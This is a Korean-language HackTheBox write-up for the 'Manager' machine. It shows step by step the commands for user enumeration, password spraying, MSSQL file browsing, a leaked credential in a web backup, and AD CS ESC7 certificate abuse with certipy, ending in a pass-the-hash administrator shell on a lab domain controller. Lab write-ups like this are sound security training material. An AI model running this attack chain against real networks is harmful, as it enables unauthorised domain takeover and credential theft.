# Manager - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,1433,3268,3269,389,445,464,49667,49693,49694,49697,49728,49739,49772,49797,53,56905,593,5985,636,80,88,9389 -sC -sV -vv -oA manager 10.129.26.5
```
<img width="1206" height="356" alt="image" src="https://github.com/user-attachments/assets/35be00fe-52d1-4cca-a6f3-2b6f8e3c71aa" />
<img width="1206" height="202" alt="image" src="https://github.com/user-attachments/assets/c95183c8-e99d-41ec-b795-19aeff9e0a6e" />
<img width="1206" height="67" alt="image" src="https://github.com/user-attachments/assets/065dc03d-fc67-43c9-98f7-07194a2435e7" />
<img width="1206" height="67" alt="image" src="https://github.com/user-attachments/assets/48915f97-6d43-4ba9-bc3f-ab45781e26ac" />

- HTTP(80)
- KERBEROS(88)
- LDAP(389)
- SMB(445)
- MSSQL(1433)
- WINRM(5985)
- CA

<br>

- `/etc/hosts`에 `dc01.manager.htb` 추가.
<img width="1204" height="72" alt="image" src="https://github.com/user-attachments/assets/1af18ff7-e008-4913-b453-3eee9c247a22" />

---
## Auth as operator
- 유저목록 수집.
```bash
nxc smb 10.129.26.5 -u guest -p '' --rid-brute|grep SidTypeUser
```
<img width="1204" height="294" alt="image" src="https://github.com/user-attachments/assets/89f711c6-4f15-4769-be09-d2b4b525e72f" />

<br>
<br>

- 유저명과 비밀번호를 일치시켜서 로그인 시도하였으나 실패.
```bash
nxc smb 10.129.26.5 -u users -p users --no-brute
```
<img width="1204" height="338" alt="image" src="https://github.com/user-attachments/assets/510c0e5d-a34e-4310-aca3-0b650aefba62" />

<br>
<br>

- 비밀번호에 소문자만 존재할 수 있어서 소문자로 변경해서 로그인 시도.
- `operator:operator`로그인 성공.
<img width="1204" height="338" alt="image" src="https://github.com/user-attachments/assets/d8ca7ff0-655c-4e2b-beba-828439c46208" />

---
## Shell as raven
- mssql 접속 가능.
```bash
nxc mssql 10.129.26.5 -u operator -p operator
```
<img width="1204" height="118" alt="image" src="https://github.com/user-attachments/assets/be9f4501-8960-4ce6-b9c4-067f756dea42" />

<br>
<br>

- mssql 접속.
```bash
impacket-mssqlclient operator:operator@10.129.26.5 -windows-auth
```
<img width="1204" height="266" alt="image" src="https://github.com/user-attachments/assets/91ea2117-bbc6-4983-b4e9-1cf0dd4c242b" />

<br>
<br>

- DB를 확인해보았으나 기본 DB만 생성되어 있음.
- `xp_cmdshell` 구성 실패.
- 해시 캡쳐 시도 실패.
- 내부 파일 탐색 시도.
```mssql
xp_dirtree c:\
```
<img width="1204" height="331" alt="image" src="https://github.com/user-attachments/assets/d5b7d463-fe71-4d7d-868d-0f63a9ae7c4a" />

<br>
<br>

- `c:\inetpub\wwwroot`에서 웹서버 발견.
<img width="1204" height="266" alt="image" src="https://github.com/user-attachments/assets/328623b6-9cba-4e00-83c5-9c858e629ff6" />

<br>
<br>

- 메인페이지의 요소들로 보여짐.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/9792c448-e0a3-4491-a8ee-b759ee857cfb" />

<br>
<br>

- `web.config`는 접근이 불가능하나 `website-backup-27-07-23-old.zip`는 접근 가능.
- 파일 다운로드.
```bash
wget http://10.129.26.5/website-backup-27-07-23-old.zip
```
<img width="1204" height="250" alt="image" src="https://github.com/user-attachments/assets/076f9dcc-9c92-4c69-8e23-746f62c405bc" />

<br>
<br>

- 압축 해제.
- `.old-conf.xml` 파일에서 raven유저의 비밀번호 노출
<img width="1204" height="288" alt="image" src="https://github.com/user-attachments/assets/510a904b-996b-4967-b552-c9cd4162a080" />

<br>
<br>

- `raven`유저 로그인 성공.
```bash
nxc smb 10.129.26.5 -u raven -p 'R4v3nBe5tD3veloP3r!123'
```
<img width="1204" height="118" alt="image" src="https://github.com/user-attachments/assets/8fe0f301-e8a2-4e00-926f-412e9f2920f6" />

<br>
<br>

- `winrm` 로그인 성공.
```bash
nxc winrm 10.129.26.5 -u raven -p 'R4v3nBe5tD3veloP3r!123'
```
<img width="1204" height="202" alt="image" src="https://github.com/user-attachments/assets/96ae8d9e-2900-4a0c-8ef2-74885022f10f" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.26.5 -u raven -p 'R4v3nBe5tD3veloP3r!123'
```
<img width="1204" height="287" alt="image" src="https://github.com/user-attachments/assets/2dc309b8-8b33-43a5-86af-1e6fc55a254a" />

---
## Privesc
- 내부에서 특별한 정보를 찾지 못함.
- `certipy`를 사용하여 `ESC7` 취약점 발견.
```bash
certipy-ad find -u raven -p 'R4v3nBe5tD3veloP3r!123' -target dc01.manager.htb -text -stdout -vulnerable
```
<img width="1204" height="70" alt="image" src="https://github.com/user-attachments/assets/2eb5d5ed-7947-4fa5-bea4-10459efde95d" />

<br>
<br>

- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca
- raven유저를 `Certificate Officer`역할을 할 수 있도록 추가.
```bash
certipy-ad ca -u raven -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target-ip 10.129.26.5 -dc-ip 10.129.26.5 -add-officer raven
```
<img width="1204" height="137" alt="image" src="https://github.com/user-attachments/assets/b1edf4c5-8191-479a-a2cb-cc8ffd2582c0" />

<br>
<br>

- `SubCA`템플릿 활성화.
```bash
certipy-ad ca -u raven -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target-ip 10.129.26.5 -dc-ip 10.129.26.5 -enable-template 'SubCA'
```
<img width="1204" height="137" alt="image" src="https://github.com/user-attachments/assets/351dac1d-7335-4acf-97cb-20630a85852c" />

<br>
<br>

- `SubCA`템플릿을 사용하여 `administrator`의 인증 요청.
```bash
certipy-ad req -u raven -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target-ip 10.129.26.5 -dc-ip 10.129.26.5 -template 'SubCA' -upn 'administrator@manager.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
```
<img width="1204" height="310" alt="image" src="https://github.com/user-attachments/assets/42b0ca88-0118-4e58-9045-946879848531" />

<br>
<br>

- 인증에 실패한 요청을 승인.
```bash
 certipy-ad ca -u raven -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target-ip 10.129.26.5 -dc-ip 10.129.26.5 -issue-request 23
```
<img width="1204" height="139" alt="image" src="https://github.com/user-attachments/assets/adb8738c-26e5-4e2f-aed3-9a4a2df0a963" />

<br>
<br>

- 인증서 재탐색.
```bash
certipy-ad req -u raven -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target-ip 10.129.26.5 -dc-ip 10.129.26.5 -retrieve 23
```
<img width="1204" height="270" alt="image" src="https://github.com/user-attachments/assets/2e1bc817-6cb1-4c34-b279-1343d55ab384" />

<br>
<br>

- 인증 시도하여 `administrator` 해시 획득.
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.26.5
```
<img width="1204" height="334" alt="image" src="https://github.com/user-attachments/assets/334548a9-7e83-430c-8e66-d2ac04961e8c" />

<br>
<br>

- winrm 로그인 성공.
```bash
nxc winrm 10.129.26.5 -u administrator -H ae5064c2f62317332c88629e025924ef
```
<img width="1204" height="269" alt="image" src="https://github.com/user-attachments/assets/416386a3-42dc-404a-8bf8-1037e96c1d68" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.26.5 -u administrator -H ae5064c2f62317332c88629e025924ef
```
<img width="1204" height="292" alt="image" src="https://github.com/user-attachments/assets/f98e2d93-f8b9-4b31-9ca8-d239c994f957" />

---
## FLAG
- `c:\users\raven\desktop\user.txt`
<img width="1204" height="208" alt="image" src="https://github.com/user-attachments/assets/ec60ff70-5839-4251-9faf-ce79e397180b" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1204" height="208" alt="image" src="https://github.com/user-attachments/assets/2b786764-cfc3-418d-a4e9-c430f5116ce2" />
